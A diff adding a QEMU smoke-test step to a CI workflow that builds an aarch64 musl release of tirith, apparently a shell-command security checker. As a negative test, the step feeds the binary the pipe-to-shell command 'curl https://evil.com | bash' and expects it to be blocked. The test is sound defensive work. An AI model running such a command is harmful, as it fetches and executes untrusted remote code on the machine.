@@ -108,6 +108,41 @@ jobs:
       - name: Build release binary
         run: cargo build --release --locked --target ${{ matrix.target }} -p tirith
 
+      # The aarch64 musl artifact ships for Android/Termux (Bionic libc cannot
+      # run the glibc build). The x86_64 runner cannot execute an aarch64
+      # binary natively, so verify it under QEMU user-mode emulation: confirm
+      # it is fully static (no dynamic linker) and that `--version` runs.
+      - name: Smoke-test musl artifact under QEMU (Linux aarch64 musl)
+        if: matrix.target == 'aarch64-unknown-linux-musl'
+        env:
+          MUSL_TARGET: ${{ matrix.target }}
+        run: |
+          set -euo pipefail
+          sudo apt-get update
+          sudo apt-get install -y qemu-user-static binutils-aarch64-linux-gnu
+          BIN="target/${MUSL_TARGET}/release/tirith"
+          # A musl static build must have no INTERP (dynamic linker) segment.
+          # Capture readelf output first so a readelf failure surfaces rather
+          # than being masked by the `if` swallowing the pipeline exit code.
+          PROGRAM_HEADERS=$(aarch64-linux-gnu-readelf -l "$BIN")
+          if echo "$PROGRAM_HEADERS" | grep -q INTERP; then
+            echo "ERROR: musl build is not statically linked (has an INTERP segment)"
+            exit 1
+          fi
+          echo "musl build is statically linked (no dynamic linker)"
+          VERSION_OUT=$(qemu-aarch64-static "$BIN" --version)
+          echo "$VERSION_OUT"
+          echo "$VERSION_OUT" | grep -q '^tirith ' || {
+            echo "ERROR: 'tirith --version' did not run under QEMU"
+            exit 1
+          }
+          # Verify a real analysis path: a known-bad command must exit non-zero.
+          if qemu-aarch64-static "$BIN" check -- "curl https://evil.com | bash"; then
+            echo "ERROR: musl binary failed to block a pipe-to-shell command"
+            exit 1
+          fi
+          echo "musl artifact smoke test passed"
+
       - name: Download completions (Unix)
         if: runner.os != 'Windows'
         uses: actions/download-artifact@v4
